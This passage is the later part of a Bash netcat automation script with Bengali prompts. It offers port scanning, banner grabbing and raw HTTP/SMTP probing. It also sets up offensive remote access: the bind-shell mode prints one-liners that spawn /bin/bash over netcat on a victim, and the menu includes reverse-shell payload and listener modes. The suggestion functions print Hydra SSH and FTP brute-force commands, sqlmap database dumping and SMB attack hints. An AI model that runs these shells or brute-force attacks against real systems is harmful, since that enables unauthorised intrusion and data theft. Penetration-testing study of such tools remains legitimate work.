    echo -e "${GREEN}[✓] সব payload save হয়েছে → $payload_file${NC}"
    echo "$(date) | Payload Gen | $my_ip:$port | $payload_file" >> "$HISTORY_FILE"
}

# ================================================================
# MODE 17 — BIND SHELL LISTENER
# ================================================================
mode_bind_shell_listener() {
    local port
    read -p "$(echo -e ${WHITE}"Bind port দিন (victim এ চালাবেন): "${NC})" port

    echo ""
    echo -e "${RED}${BOLD}[!] এই command victim/target machine এ চালাতে হবে:${NC}"
    echo ""

    if [ "$NC_HAS_E" = true ]; then
        echo -e "  ${YELLOW}$NC_CMD -lvnp $port -e /bin/bash${NC}"
    else
        echo -e "  ${YELLOW}rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvnp $port >/tmp/f${NC}"
    fi

    echo ""
    echo -e "${GREEN}[*] তারপর attacker থেকে connect করুন:${NC}"
    echo -e "  ${CYAN}nc $TARGET $port${NC}"
    echo ""
    echo -e "${DIM}[!] এই script bind shell চালু করে না — শুধু command দেখায়।${NC}"

    echo "$(date) | Bind Shell Info | port:$port" >> "$HISTORY_FILE"
}

# ================================================================
# MODE 18 — BIND SHELL CONNECT
# ================================================================
mode_bind_shell_connect() {
    local target=$1
    local port
    read -p "$(echo -e ${WHITE}"Bind shell port দিন: "${NC})" port

    echo ""
    echo -e "${GREEN}${BOLD}[*] $target:$port এ connect করা হচ্ছে (bind shell)...${NC}"
    echo ""

    $NC_CMD "$target" "$port"
}

# ================================================================
# MODE 19 — PORT RELAY
# ================================================================
mode_port_relay() {
    echo ""
    echo -e "${CYAN}${BOLD}TCP Port Relay Setup:${NC}"
    echo ""
    read -p "$(echo -e ${WHITE}"Listen port (local): "${NC})" listen_port
    read -p "$(echo -e ${WHITE}"Forward to IP: "${NC})" fwd_ip
    read -p "$(echo -e ${WHITE}"Forward to Port: "${NC})" fwd_port

    echo ""
    echo -e "${GREEN}[*] Port Relay setup:${NC}"
    echo -e "  ${WHITE}Local:$listen_port → $fwd_ip:$fwd_port${NC}"
    echo ""

    if command -v mkfifo &>/dev/null; then
        local pipe="/tmp/relay_pipe_$$"
        mkfifo "$pipe"
        echo -e "${CYAN}[*] Relay চালু হচ্ছে... Ctrl+C দিয়ে বন্ধ করুন।${NC}"
        $NC_CMD -lvnp "$listen_port" < "$pipe" | $NC_CMD "$fwd_ip" "$fwd_port" > "$pipe"
        rm -f "$pipe"
    else
        echo -e "${RED}[!] mkfifo পাওয়া যায়নি — relay সম্ভব হচ্ছে না।${NC}"
        echo -e "${YELLOW}Alternative: socat TCP-LISTEN:$listen_port,fork TCP:$fwd_ip:$fwd_port${NC}"
    fi
}

# ================================================================
# MODE 20 — HTTP PROXY TEST
# ================================================================
mode_http_proxy_test() {
    local target=$1
    echo ""
    read -p "$(echo -e ${WHITE}"Proxy IP দিন: "${NC})" proxy_ip
    read -p "$(echo -e ${WHITE}"Proxy Port দিন: "${NC})" proxy_port
    read -p "$(echo -e ${WHITE}"Test URL দিন (e.g. http://example.com): "${NC})" test_url

    echo ""
    echo -e "${CYAN}[*] Proxy $proxy_ip:$proxy_port দিয়ে $test_url test করা হচ্ছে...${NC}"
    echo ""

    printf "GET %s HTTP/1.0\r\nHost: %s\r\n\r\n" "$test_url" "$target" | \
        $NC_CMD -w 8 "$proxy_ip" "$proxy_port" 2>&1 | head -20
}

# ================================================================
# MODE 21 — PERSISTENT LISTENER
# ================================================================
mode_persistent_listener() {
    local port
    read -p "$(echo -e ${WHITE}"Persistent listen port দিন: "${NC})" port

    echo ""
    echo -e "${GREEN}${BOLD}[*] Persistent listener চালু হচ্ছে port $port এ...${NC}"
    echo -e "${YELLOW}[!] Connection drop হলে automatically restart হবে।${NC}"
    echo -e "${YELLOW}[!] বন্ধ করতে Ctrl+C${NC}"
    echo ""

    while true; do
        echo -e "${CYAN}[*] Waiting for connection on port $port...${NC}"
        $NC_CMD -lvnp "$port"
        echo -e "${YELLOW}[!] Connection closed. Restarting listener...${NC}"
        sleep 1
    done
}

# ================================================================
# MODE 22 — RAW HTTP GET
# ================================================================
mode_raw_http_get() {
    local target=$1
    local port="${TARGET_PORT:-80}"
    read -p "$(echo -e ${WHITE}"Path দিন (e.g. /index.html, Enter=/): "${NC})" path
    [ -z "$path" ] && path="/"
    init_output "RawHTTPGET"

    echo ""
    echo -e "${CYAN}[*] Raw HTTP GET: $target:$port$path${NC}"
    echo ""

    local tmp
    tmp=$(mktemp)

    printf "GET %s HTTP/1.1\r\nHost: %s\r\nConnection: close\r\n\r\n" "$path" "$target" | \
        $NC_CMD -w 10 "$target" "$port" 2>&1 | tee "$tmp"

    echo ""
    save_results "$tmp"
    rm -f "$tmp"
}

# ================================================================
# MODE 23 — RAW HTTP POST
# ================================================================
mode_raw_http_post() {
    local target=$1
    local port="${TARGET_PORT:-80}"
    read -p "$(echo -e ${WHITE}"Path দিন (e.g. /login): "${NC})" path
    read -p "$(echo -e ${WHITE}"POST data দিন (e.g. user=admin&pass=123): "${NC})" post_data
    [ -z "$path" ] && path="/"
    local content_length=${#post_data}
    init_output "RawHTTPPOST"

    echo ""
    echo -e "${CYAN}[*] Raw HTTP POST: $target:$port$path${NC}"
    echo ""

    local tmp
    tmp=$(mktemp)

    printf "POST %s HTTP/1.1\r\nHost: %s\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %d\r\nConnection: close\r\n\r\n%s" \
        "$path" "$target" "$content_length" "$post_data" | \
        $NC_CMD -w 10 "$target" "$port" 2>&1 | tee "$tmp"

    echo ""
    save_results "$tmp"
    rm -f "$tmp"
}

# ================================================================
# MODE 24 — SMTP MANUAL TEST
# ================================================================
mode_smtp_manual() {
    local target=$1
    local port="${TARGET_PORT:-25}"
    init_output "SMTPManual"

    echo ""
    echo -e "${CYAN}[*] SMTP Manual Test: $target:$port${NC}"
    echo -e "${YELLOW}[!] Interactive mode — নিজে SMTP commands দিন।${NC}"
    echo -e "${DIM}EHLO → MAIL FROM → RCPT TO → DATA → QUIT${NC}"
    echo ""

    $NC_CMD -C "$target" "$port" 2>/dev/null || $NC_CMD "$target" "$port"
}

# ================================================================
# MODE 25 — CUSTOM RAW COMMAND
# ================================================================
mode_custom_raw() {
    local target=$1
    local port
    read -p "$(echo -e ${WHITE}"Port দিন: "${NC})" port
    read -p "$(echo -e ${WHITE}"পাঠানোর data দিন: "${NC})" raw_data
    init_output "CustomRaw"

    echo ""
    echo -e "${CYAN}[*] Raw data পাঠানো হচ্ছে $target:$port...${NC}"
    echo ""

    local tmp
    tmp=$(mktemp)

    echo -e "$raw_data" | $NC_CMD -w 8 "$target" "$port" 2>&1 | tee "$tmp"

    echo ""
    save_results "$tmp"
    rm -f "$tmp"
}

# ================================================================
# MODE 26 — ZERO I/O (PORT ALIVE CHECK)
# ================================================================
mode_zero_io() {
    local target=$1
    local port
    [ -n "$TARGET_PORT" ] && port="$TARGET_PORT" || read -p "$(echo -e ${WHITE}"Port দিন: "${NC})" port
    init_output "PortAlive"

    echo ""
    echo -e "${CYAN}[*] Port alive check: $target:$port${NC}"
    echo ""

    $NC_CMD -z -v -w 3 "$target" "$port" 2>&1
    local exit_code=$?

    echo ""
    if [ $exit_code -eq 0 ]; then
        echo -e "  ${GREEN}${BOLD}[✓] Port $port এ connection সফল — OPEN${NC}"
    else
        echo -e "  ${RED}[✗] Port $port — CLOSED বা FILTERED${NC}"
    fi
}

# ================================================================
# MODE 27 — MULTIPLE PORTS
# ================================================================
mode_multiple_ports() {
    local target=$1
    echo ""
    echo -e "${CYAN}কোন ports check করবেন? (space দিয়ে আলাদা করুন)${NC}"
    echo -e "${DIM}উদাহরণ: 22 80 443 8080 3306${NC}"
    read -p "$(echo -e ${YELLOW}"Ports: "${NC})" port_list
    init_output "MultiPort"

    local tmp
    tmp=$(mktemp)
    local open_ports=()

    echo ""
    for port in $port_list; do
        $NC_CMD -z -w 2 "$target" "$port" 2>/dev/null
        if [ $? -eq 0 ]; then
            open_ports+=("$port")
            echo -e "  ${GREEN}[✓] Port $port — OPEN${NC}"
            echo "OPEN: $port" >> "$tmp"
        else
            echo -e "  ${RED}[✗] Port $port — closed${NC}"
        fi
    done

    echo ""
    bangla_analysis_range "$tmp" "$target" "${open_ports[@]}"
    suggest_next_tool_range "$tmp" "$target"
    save_results "$tmp"
    rm -f "$tmp"
}

# ================================================================
# MODE 28 — ALL-IN-ONE RECON
# ================================================================
mode_allinone() {
    local target=$1
    init_output "AllInOne"

    echo ""
    echo -e "${CYAN}${BOLD}[*] All-in-One Recon: $target${NC}"
    echo ""

    local tmp
    tmp=$(mktemp)

    echo -e "${CYAN}━━━ Common Ports Scan ━━━${NC}"
    local common_ports=(21 22 23 25 53 80 110 139 143 443 445 3306 3389 5432 5900 6379 8080 8443 27017)
    local open_ports=()
    for port in "${common_ports[@]}"; do
        $NC_CMD -z -w 2 "$target" "$port" 2>/dev/null
        if [ $? -eq 0 ]; then
            open_ports+=("$port")
            echo -e "  ${GREEN}[✓] Port $port — OPEN${NC}"
            echo "OPEN: $port" >> "$tmp"
        fi
    done

    echo ""
    echo -e "${CYAN}━━━ Banner Grab (open ports) ━━━${NC}"
    for port in "${open_ports[@]}"; do
        echo -e "${YELLOW}[*] Port $port banner:${NC}"
        local banner
        banner=$(echo "" | $NC_CMD -w 3 "$target" "$port" 2>/dev/null | head -3)
        if [ -n "$banner" ]; then
            echo "$banner" | head -3 | while IFS= read -r line; do
                echo -e "   ${WHITE}$line${NC}"
            done
            echo "BANNER $port: $banner" >> "$tmp"
        else
            echo -e "   ${DIM}(no banner)${NC}"
        fi
    done

    echo ""
    bangla_analysis_range "$tmp" "$target" "${open_ports[@]}"
    suggest_next_tool_range "$tmp" "$target"
    save_results "$tmp"
    rm -f "$tmp"
}

# ================================================================
# BANGLA ANALYSIS — PORT SINGLE
# ================================================================
bangla_analysis_port() {
    local outfile=$1
    local target=$2

    echo ""
    echo -e "${MAGENTA}${BOLD}╔══════════════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${MAGENTA}${BOLD}║             বাংলায় বিশ্লেষণ                                        ║${NC}"
    echo -e "${MAGENTA}${BOLD}╚══════════════════════════════════════════════════════════════════════╝${NC}"
    echo ""

    if grep -q "OPEN" "$outfile" 2>/dev/null; then
        echo -e "  ${GREEN}[✓] Port open — connection সম্ভব।${NC}"
        echo -e "  ${YELLOW}→ Banner grab করে service version জানুন।${NC}"
        echo -e "  ${CYAN}→ Nmap দিয়ে বিস্তারিত scan করুন।${NC}"
    else
        echo -e "  ${RED}[✗] Port বন্ধ বা filtered।${NC}"
        echo -e "  ${YELLOW}→ Firewall block করছে অথবা service চলছে না।${NC}"
    fi
    echo ""
}

# ================================================================
# BANGLA ANALYSIS — BANNER
# ================================================================
bangla_analysis_banner() {
    local outfile=$1
    local target=$2
    local port=$3

    echo ""
    echo -e "${MAGENTA}${BOLD}╔══════════════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${MAGENTA}${BOLD}║             বাংলায় Banner বিশ্লেষণ                                 ║${NC}"
    echo -e "${MAGENTA}${BOLD}╚══════════════════════════════════════════════════════════════════════╝${NC}"
    echo ""

    if [ ! -s "$outfile" ]; then
        echo -e "  ${YELLOW}[!] কোনো banner পাওয়া যায়নি।${NC}"
        echo ""
        return
    fi

    # Detect service from banner
    if grep -qi "SSH" "$outfile"; then
        local ver; ver=$(grep -i "SSH" "$outfile" | head -1 | grep -oP "SSH-[\d.]+-\S+")
        echo -e "  ${CYAN}[*] SSH Service detect হয়েছে।${NC}"
        echo -e "  ${WHITE}Version: ${YELLOW}$ver${NC}"
        echo -e "  ${YELLOW}→ Brute force risk আছে। Public key auth use করুন।${NC}"
        echo -e "  ${CYAN}→ Hydra দিয়ে brute force test করুন।${NC}"
    fi
    if grep -qi "HTTP\|Apache\|nginx\|IIS\|Server:" "$outfile"; then
        local server; server=$(grep -i "Server:" "$outfile" | head -1)
        echo -e "  ${CYAN}[*] HTTP/Web Service detect হয়েছে।${NC}"
        echo -e "  ${WHITE}$server${NC}"
        echo -e "  ${YELLOW}→ Web application vulnerability test করুন।${NC}"
        echo -e "  ${CYAN}→ Nikto বা Gobuster দিয়ে deeper scan করুন।${NC}"
    fi
    if grep -qi "FTP\|220\|vsftpd\|ProFTPD" "$outfile"; then
        echo -e "  ${CYAN}[*] FTP Service detect হয়েছে।${NC}"
        echo -e "  ${RED}→ Anonymous login check করুন।${NC}"
        if grep -q "230" "$outfile"; then
            echo -e "  ${RED}${BOLD}→ Anonymous login সফল! ঝুঁকি: CRITICAL${NC}"
        fi
    fi
    if grep -qi "SMTP\|220\|Postfix\|Sendmail\|Exim" "$outfile"; then
        echo -e "  ${CYAN}[*] SMTP Mail Server detect হয়েছে।${NC}"
        echo -e "  ${YELLOW}→ Open relay test করুন।${NC}"
        echo -e "  ${YELLOW}→ User enumeration সম্ভব (VRFY/EXPN command)।${NC}"
    fi
    if grep -qi "MySQL\|MariaDB" "$outfile"; then
        echo -e "  ${RED}${BOLD}[!] MySQL Database সরাসরি exposed!${NC}"
        echo -e "  ${RED}→ ঝুঁকি: CRITICAL — Database internet এ open।${NC}"
    fi
    if grep -qi "MongoDB" "$outfile"; then
        echo -e "  ${RED}${BOLD}[!] MongoDB exposed!${NC}"
        echo -e "  ${RED}→ Authentication ছাড়া data access সম্ভব হতে পারে। ঝুঁকি: CRITICAL${NC}"
    fi
    if grep -qi "Redis" "$outfile"; then
        echo -e "  ${RED}${BOLD}[!] Redis exposed!${NC}"
        echo -e "  ${RED}→ Authentication নেই হলে সব data পড়া সম্ভব। ঝুঁকি: CRITICAL${NC}"
    fi
    echo ""
}

# ================================================================
# BANGLA ANALYSIS — PORT RANGE
# ================================================================
bangla_analysis_range() {
    local outfile=$1
    local target=$2
    shift 2
    local open_ports=("$@")

    echo ""
    echo -e "${MAGENTA}${BOLD}╔══════════════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${MAGENTA}${BOLD}║             বাংলায় স্ক্যান রিপোর্ট বিশ্লেষণ                      ║${NC}"
    echo -e "${MAGENTA}${BOLD}╚══════════════════════════════════════════════════════════════════════╝${NC}"
    echo ""

    local total="${#open_ports[@]}"

    if [ "$total" -eq 0 ]; then
        echo -e "  ${GREEN}[✓] কোনো open port পাওয়া যায়নি।${NC}"
        echo ""
        return
    fi

    echo -e "  ${WHITE}মোট Open Ports: ${GREEN}$total${NC}"
    echo ""

    local critical=0 high=0 medium=0

    for port in "${open_ports[@]}"; do
        case $port in
            23|3389|5900)
                critical=$((critical+1))
                echo -e "  ${RED}${BOLD}🚨 Port $port — CRITICAL ঝুঁকি${NC}"
                case $port in
                    23)   echo -e "     ${WHITE}→ Telnet চলছে — সব data plaintext, এখনই বন্ধ করুন!${NC}" ;;
                    3389) echo -e "     ${WHITE}→ RDP exposed — BlueKeep / brute force ঝুঁকি!${NC}" ;;
                    5900) echo -e "     ${WHITE}→ VNC exposed — remote desktop access সম্ভব!${NC}" ;;
                esac ;;
            21|445|3306|5432|6379|27017)
                high=$((high+1))
                echo -e "  ${YELLOW}${BOLD}⚠ Port $port — HIGH ঝুঁকি${NC}"
                case $port in
                    21)    echo -e "     ${WHITE}→ FTP — anonymous login check করুন।${NC}" ;;
                    445)   echo -e "     ${WHITE}→ SMB — EternalBlue (MS17-010) check করুন!${NC}" ;;
                    3306)  echo -e "     ${WHITE}→ MySQL publicly exposed! Database চুরির ঝুঁকি।${NC}" ;;
                    5432)  echo -e "     ${WHITE}→ PostgreSQL exposed! DB access সম্ভব।${NC}" ;;
                    6379)  echo -e "     ${WHITE}→ Redis exposed! Authentication নেই হলে critical।${NC}" ;;
                    27017) echo -e "     ${WHITE}→ MongoDB exposed! NoAuth হলে সব data readable।${NC}" ;;
                esac ;;
            22|25|53|80|443|8080|8443|110|143|139)
                medium=$((medium+1))
                echo -e "  ${CYAN}[*] Port $port — MEDIUM / INFO${NC}"
                case $port in
                    22)  echo -e "     ${WHITE}→ SSH — brute force test করুন (Hydra)।${NC}" ;;
                    25)  echo -e "     ${WHITE}→ SMTP — open relay ও user enum test করুন।${NC}" ;;
                    80|443|8080|8443) echo -e "     ${WHITE}→ Web service — Nikto/Gobuster দিয়ে scan করুন।${NC}" ;;
                    139) echo -e "     ${WHITE}→ NetBIOS/SMB — enum4linux দিয়ে enumerate করুন।${NC}" ;;
                esac ;;
        esac
        echo ""
    done

    echo -e "  ${CYAN}${BOLD}━━━ সামগ্রিক ঝুঁকি মূল্যায়ন ━━━${NC}"
    echo -e "  ${RED}   Critical : $critical টি${NC}"
    echo -e "  ${YELLOW}   High     : $high টি${NC}"
    echo -e "  ${CYAN}   Medium   : $medium টি${NC}"
    echo ""

    if   [ "$critical" -gt 0 ]; then
        echo -e "  ${RED}${BOLD}  সার্বিক ঝুঁকি : ██████████ CRITICAL — এখনই পদক্ষেপ নিন!${NC}"
    elif [ "$high" -gt 0 ]; then
        echo -e "  ${YELLOW}${BOLD}  সার্বিক ঝুঁকি : ███████░░░ HIGH — দ্রুত patch করুন।${NC}"
    elif [ "$medium" -gt 0 ]; then
        echo -e "  ${CYAN}  সার্বিক ঝুঁকি : █████░░░░░ MEDIUM — মনোযোগ দিন।${NC}"
    else
        echo -e "  ${GREEN}  সার্বিক ঝুঁকি : ███░░░░░░░ LOW — তবু সতর্ক থাকুন।${NC}"
    fi
    echo ""
}

# ================================================================
# NEXT TOOL SUGGESTION — PORT
# ================================================================
suggest_next_tool_port() {
    local outfile=$1
    local target=$2
    local port=$3

    echo -e "${CYAN}${BOLD}╔══════════════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${CYAN}${BOLD}║             পরবর্তী Tool এর সাজেশন                                 ║${NC}"
    echo -e "${CYAN}${BOLD}╚══════════════════════════════════════════════════════════════════════╝${NC}"
    echo ""

    if grep -q "OPEN" "$outfile" 2>/dev/null; then
        echo -e "  ${GREEN}${BOLD}🗺️  Nmap${NC} — Port এর বিস্তারিত scan করুন"
        echo -e "     ${CYAN}কমান্ড: nmap -sV -sC -p $port $target${NC}"
        echo ""
        case $port in
            22) echo -e "  ${YELLOW}${BOLD}🔑 Hydra${NC} — SSH Brute Force"
                echo -e "     ${CYAN}কমান্ড: hydra -L users.txt -P rockyou.txt ssh://$target${NC}"; echo "" ;;
            80|443|8080)
                echo -e "  ${WHITE}${BOLD}🌐 Nikto${NC} — Web Vulnerability Scan"
                echo -e "     ${CYAN}কমান্ড: nikto -h http://$target:$port${NC}"; echo ""
                echo -e "  ${MAGENTA}${BOLD}🔍 Gobuster${NC} — Directory Scan"
                echo -e "     ${CYAN}কমান্ড: gobuster dir -u http://$target:$port -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt${NC}"; echo "" ;;
            21) echo -e "  ${RED}${BOLD}📂 FTP Anonymous Test${NC}"
                echo -e "     ${CYAN}কমান্ড: nc $target 21 (তারপর USER anonymous)${NC}"; echo "" ;;
            445) echo -e "  ${RED}${BOLD}💀 enum4linux${NC} — SMB Enumeration"
                 echo -e "     ${CYAN}কমান্ড: enum4linux -a $target${NC}"; echo "" ;;
            3306) echo -e "  ${RED}${BOLD}🗄️  MySQL Direct Connect${NC}"
                  echo -e "     ${CYAN}কমান্ড: mysql -h $target -u root -p${NC}"; echo "" ;;
        esac
    fi
}

# ================================================================
# NEXT TOOL SUGGESTION — RANGE
# ================================================================
suggest_next_tool_range() {
    local outfile=$1
    local target=$2

    echo -e "${CYAN}${BOLD}╔══════════════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${CYAN}${BOLD}║             পরবর্তী Tool এর সাজেশন                                 ║${NC}"
    echo -e "${CYAN}${BOLD}╚══════════════════════════════════════════════════════════════════════╝${NC}"
    echo ""

    if grep -qE "OPEN: (80|443|8080|8443)" "$outfile" 2>/dev/null; then
        echo -e "  ${WHITE}${BOLD}🌐 Nikto${NC} — Web Vulnerability Scan"
        echo -e "     ${CYAN}কমান্ড: nikto -h http://$target${NC}"; echo ""
        echo -e "  ${MAGENTA}${BOLD}🔍 Gobuster / FFUF${NC} — Directory Fuzzing"
        echo -e "     ${CYAN}কমান্ড: gobuster dir -u http://$target -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt${NC}"; echo ""
    fi
    if grep -qE "OPEN: 22" "$outfile" 2>/dev/null; then
        echo -e "  ${YELLOW}${BOLD}🔑 Hydra${NC} — SSH Brute Force"
        echo -e "     ${CYAN}কমান্ড: hydra -L users.txt -P rockyou.txt ssh://$target${NC}"; echo ""
    fi
    if grep -qE "OPEN: 445" "$outfile" 2>/dev/null; then
        echo -e "  ${RED}${BOLD}💀 enum4linux / Metasploit${NC} — SMB Attack"
        echo -e "     ${CYAN}কমান্ড: enum4linux -a $target${NC}"; echo ""
    fi
    if grep -qE "OPEN: (3306|5432|27017|6379)" "$outfile" 2>/dev/null; then
        echo -e "  ${RED}${BOLD}🗄️  SQLmap / DB Direct Connect${NC} — Database Attack"
        echo -e "     ${CYAN}কমান্ড: sqlmap -u \"http://$target/?id=1\" --dbs --batch${NC}"; echo ""
    fi
    echo -e "  ${GREEN}${BOLD}🗺️  Nmap${NC} — Detailed Service/Vuln Scan"
    echo -e "     ${CYAN}কমান্ড: nmap -A -sV --script vuln $target${NC}"; echo ""
    echo -e "  ${MAGENTA}${BOLD}🔍 Nuclei${NC} — Vulnerability Template Scan"
    echo -e "     ${CYAN}কমান্ড: nuclei -u http://$target -t . -severity medium,high,critical${NC}"; echo ""
}

# ================================================================
# NEXT TOOL SUGGESTION — BANNER
# ================================================================
suggest_next_tool_banner() {
    local outfile=$1
    local target=$2
    local port=$3

    echo -e "${CYAN}${BOLD}╔══════════════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${CYAN}${BOLD}║             পরবর্তী Tool এর সাজেশন                                 ║${NC}"
    echo -e "${CYAN}${BOLD}╚══════════════════════════════════════════════════════════════════════╝${NC}"
    echo ""

    echo -e "  ${GREEN}${BOLD}🗺️  Nmap${NC} — Service Version + Vulnerability Scan"
    echo -e "     ${CYAN}কমান্ড: nmap -sV -sC --script vuln -p $port $target${NC}"; echo ""

    if grep -qi "SSH" "$outfile"; then
        echo -e "  ${YELLOW}${BOLD}🔑 Hydra${NC} — SSH Brute Force"
        echo -e "     ${CYAN}কমান্ড: hydra -L users.txt -P rockyou.txt ssh://$target${NC}"; echo ""
    fi
    if grep -qi "HTTP\|Apache\|nginx" "$outfile"; then
        echo -e "  ${WHITE}${BOLD}🌐 Nikto${NC} — Web Vulnerability Scan"
        echo -e "     ${CYAN}কমান্ড: nikto -h http://$target:$port${NC}"; echo ""
    fi
    if grep -qi "FTP" "$outfile"; then
        echo -e "  ${RED}${BOLD}📂 FTP Anonymous + Hydra${NC}"
        echo -e "     ${CYAN}কমান্ড: hydra -l anonymous -P /dev/null ftp://$target${NC}"; echo ""
    fi
}

# ================================================================
# SAVE RESULTS
# ================================================================
save_results() {
    local tmp=$1

    echo ""
    read -p "$(echo -e ${YELLOW}"[?] Result save করবেন? (y/n): "${NC})" sc
    if [[ "$sc" =~ ^[Yy]$ ]]; then
        local fname="${OUTPUT_FILE:-$RESULTS_DIR/nc_result_$(date +%Y%m%d_%H%M%S).txt}"
        {
            echo "============================================================"
            echo "  NETCAT RESULTS  —  SAIMUM's Netcat Automation Tool"
            echo "  Target : ${TARGET:-listener}"
            echo "  Mode   : ${SCAN_LABEL:-custom}"
            echo "  Date   : $(date)"
            echo "============================================================"
            echo ""
            cat "$tmp"
        } > "$fname"
        echo -e "${GREEN}[✓] Saved → $fname${NC}"
        echo "$(date) | ${SCAN_LABEL:-custom} | ${TARGET:-listener} | $fname" >> "$HISTORY_FILE"
    fi
    echo ""
}

# ================================================================
# MAIN LOOP
# ================================================================
main() {
    show_banner
    check_deps

    while true; do
        show_menu
        read -p "$(echo -e ${YELLOW}"[?] Mode select করুন [0-28]: "${NC})" choice

        if [[ "$choice" == "0" ]]; then
            echo ""
            echo -e "${GREEN}${BOLD} Goodbye! Stay legal & ethical! 🛡️${NC}"
            echo ""
            exit 0
        fi

        # Listener modes don't need a target
        local listener_modes=(10 12 13 15 17 21)
        local needs_target=true
        for lm in "${listener_modes[@]}"; do
            [ "$choice" -eq "$lm" ] 2>/dev/null && needs_target=false && break
        done

        if [ "$needs_target" = true ] && [ "$choice" -ne 16 ]; then
            get_target
            [ -n "$TARGET" ] && pre_scan_recon "$TARGET"
        fi

        case $choice in
            1)  mode_single_port "$TARGET" "$TARGET_PORT" ;;
            2)  mode_port_range "$TARGET" ;;
            3)  mode_common_ports "$TARGET" ;;
            4)  mode_udp_scan "$TARGET" ;;
            5)  mode_banner_grab "$TARGET" "$TARGET_PORT" ;;
            6)  mode_http_banner "$TARGET" ;;
            7)  mode_smtp_banner "$TARGET" ;;
            8)  mode_ftp_banner "$TARGET" ;;
            9)  mode_ssh_banner "$TARGET" ;;
            10) mode_tcp_listener ;;
            11) mode_file_send "$TARGET" ;;
            12) mode_file_receive ;;
            13) mode_chat_listener ;;
            14) mode_chat_connect "$TARGET" ;;
            15) mode_reverse_shell_listener ;;
            16) mode_reverse_shell_payload ;;
            17) mode_bind_shell_listener ;;
            18) mode_bind_shell_connect "$TARGET" ;;
            19) mode_port_relay ;;
            20) mode_http_proxy_test "$TARGET" ;;
            21) mode_persistent_listener ;;
            22) mode_raw_http_get "$TARGET" ;;
            23) mode_raw_http_post "$TARGET" ;;
            24) mode_smtp_manual "$TARGET" ;;
            25) mode_custom_raw "$TARGET" ;;
            26) mode_zero_io "$TARGET" ;;
            27) mode_multiple_ports "$TARGET" ;;
            28) mode_allinone "$TARGET" ;;
            *)  echo -e "${RED}[!] ভুল অপশন।${NC}" ;;
        esac

        echo ""
        read -p "$(echo -e ${YELLOW}"[?] আরেকটি mode চালাবেন? (y/n): "${NC})" again
        [[ ! "$again" =~ ^[Yy]$ ]] && {
            echo ""
            echo -e "${GREEN}${BOLD} Goodbye! Stay legal & ethical! 🛡️${NC}"
            echo ""
            exit 0
        }
        show_banner
    done
}

main
